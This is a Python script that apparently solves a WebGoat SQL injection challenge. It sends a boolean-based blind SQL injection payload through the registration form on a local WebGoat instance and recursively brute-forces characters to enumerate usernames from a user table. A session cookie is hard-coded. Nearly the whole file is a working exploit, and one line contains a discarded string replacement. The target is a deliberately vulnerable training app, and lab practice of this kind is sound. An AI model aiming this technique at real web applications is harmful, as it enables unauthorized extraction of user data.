import json
import requests
collected_usernames = []
def extract_username(prefix):
    charset = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','$_']
    found_count = 1
    request_headers = {
        'Cookie': 'JSESSIONID=qcFstFrpPb1Lujrwjxq6j9J4tjdaS87He0UWJYfN',
    }
    sql_injection = 'tom\' and (Select count(USERID) from  SQL_CHALLENGE_USERS  where USERID like \'{}%\' ESCAPE \'$\')> 0;--'.format(prefix)
    request_data = {
        'username_reg': sql_injection,
        'email_reg': 'tom@gmail.com',
        'password_reg': '111',
        'confirm_password_reg': '111'
    }
    response = requests.put('http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge', headers=request_headers, data=request_data)
    try:
        parsed_response = json.loads(response.text)
    except:
        print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
        return
    if "already exists please try to register with a different username" in parsed_response['feedback']:
        for char in charset:
            found_count += extract_username(prefix + char)
        if(found_count == 1):
            prefix.replace('$','')
            collected_usernames.append(prefix.replace('$',''))
        return 1
    else:
        return 0
extract_username('')
print(collected_usernames)
